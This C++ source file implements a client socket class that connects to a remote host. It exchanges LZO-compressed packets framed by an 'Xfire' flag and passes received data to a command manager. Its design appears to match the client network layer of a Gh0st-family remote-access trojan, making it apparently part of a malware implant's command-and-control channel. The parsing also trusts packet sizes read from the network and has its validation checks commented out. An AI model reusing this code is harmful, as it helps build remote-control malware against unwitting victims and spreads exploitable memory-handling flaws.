// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ClientSocket.h"
#include "minilzo.h"
#include <process.h>
#include <MSTcpIP.h>
#include <tchar.h>
#include "Manager.h"

#pragma comment (lib, "Ws2_32.lib")

#define HEAP_ALLOC(var,size)  lzo_align_t __LZO_MMODEL var [ ((size) + (sizeof(lzo_align_t) - 1)) / sizeof(lzo_align_t) ]

static HEAP_ALLOC(wrkmem, LZO1X_1_MEM_COMPRESS);

CClientSocket::CClientSocket()
{
	m_hWorkerThread = NULL;
	m_pManager = NULL;
	ws2_32 = NULL;

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
	// Packet Flag;
	BYTE bPacketFlag[] = { 'X', 'f', 'i', 'r', 'e' };
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}

CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);

	WSACleanup();

	FreeLibrary(ws2_32);
	CloseHandle(ws2_32);
}

bool CClientSocket::Connect(LPCSTR lpszHost, UINT nPort)
{
	Disconnect();

	ResetEvent(m_hEvent);
	m_bIsRunning = false;

	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (m_Socket == SOCKET_ERROR)
	{
		return false;
	}

	hostent * pHostent = gethostbyname(lpszHost);

	if (pHostent == NULL)
		return false;

	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	ClientAddr.sin_port = htons(nPort);
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
	{
		//MsgErr("ClientSocket::Connect Error");
		return false;
	}

	// Set KeepAlive
	const char chOpt = 1; // True
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, &chOpt, sizeof(chOpt)) == 0)
	{
		tcp_keepalive klive;
		klive.onoff = 1;
		klive.keepalivetime = 1000 * 30 * 1;
		klive.keepaliveinterval = 1000 * 10;

		unsigned long rt = 1;
		WSAIoctl(m_Socket, SIO_KEEPALIVE_VALS, &klive, sizeof(tcp_keepalive), NULL, 0, &rt, 0, NULL);
	}

	m_bIsRunning = true;
	m_hWorkerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	return true;
}

DWORD __stdcall CClientSocket::WorkThread(LPVOID lparam)
{
	CClientSocket *pThis = (CClientSocket *)lparam;

	char buff[MAX_RECV_BUFFER];
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);

	while (pThis->IsRunning())
	{
		fd_set fdRead = fdSocket;

		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));

			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}
			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize);
		}
	}

	return -1;
}

void CClientSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}

void CClientSocket::Disconnect()
{
	//
	// If we're supposed to abort the connection, set the linger value
	// on the socket to 0.
	//

	LINGER lingerStruct;
	lingerStruct.l_onoff = 1;
	lingerStruct.l_linger = 0;
	setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct));

	CancelIo((HANDLE)m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);

	SetEvent(m_hEvent);

	m_Socket = INVALID_SOCKET;
}

void CClientSocket::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
{
	if (lzo_init() != LZO_E_OK)
	{
		return;
	}
	__try
	{
		if (dwIoSize == 0)
		{
			Disconnect();
			return;
		}
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Don't forget there could be a partial, 1, 1 or more + partial messages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);

		// Check real Data
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));

			//	if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
			//		throw "bad buffer";

			int nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));

			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= (unsigned int)nSize)
			{
				int nUnCompressLength = 0;
				// Read off header
				m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE)&nUnCompressLength, sizeof(int));
				// SO you would process your data here
				//
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];

				//if (pData == NULL || pDeCompressionData == NULL)
				//	throw "bad Allocate";

				m_CompressionBuffer.Read(pData, nCompressLength);

				unsigned long destLen = nUnCompressLength;
				int	nRet = lzo1x_decompress(pData, nCompressLength, pDeCompressionData, &destLen, NULL);

				if (nRet == LZO_E_OK)
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}

				delete[] pData;
				delete[] pDeCompressionData;
			}
			else
				break;
		}
	}
	__except (1)
	{
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}
}

int CClientSocket::Send(LPBYTE lpData, UINT nSize)
{
	if (lzo_init() != LZO_E_OK)
	{
		return 3;
	}

	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		//unsigned long destLen = (unsigned long)nSize + 12;
		unsigned long destLen = nSize + nSize / 16 + 64 + 3;

		LPBYTE pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		int	nRet = lzo1x_1_compress(lpData, nSize, pDest, &destLen, wrkmem);

		if (nRet != LZO_E_OK)
		{
			delete[] pDest;
			return -1;
		}

		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nSize, sizeof(nSize));
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);
		delete[] pDest;

		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);

		delete[] lpResendWriteBuffer;
	}
	else
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
	}

	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}

int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, int nSplitSize)
{
	int nRet = 0;
	const char *pbuf = (char *)lpData;
	int size, nSend = 0, nSendRetry = 15, i;

	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);

			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
		{
			return -1;
		}

		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10);
	}

	if (size > 0)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
		{
			return -1;
		}
		nSend += nRet;
	}

	if (nSend == (int)nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void CClientSocket::setManagerCallBack(CManager *pManager)
{
	m_pManager = pManager;
}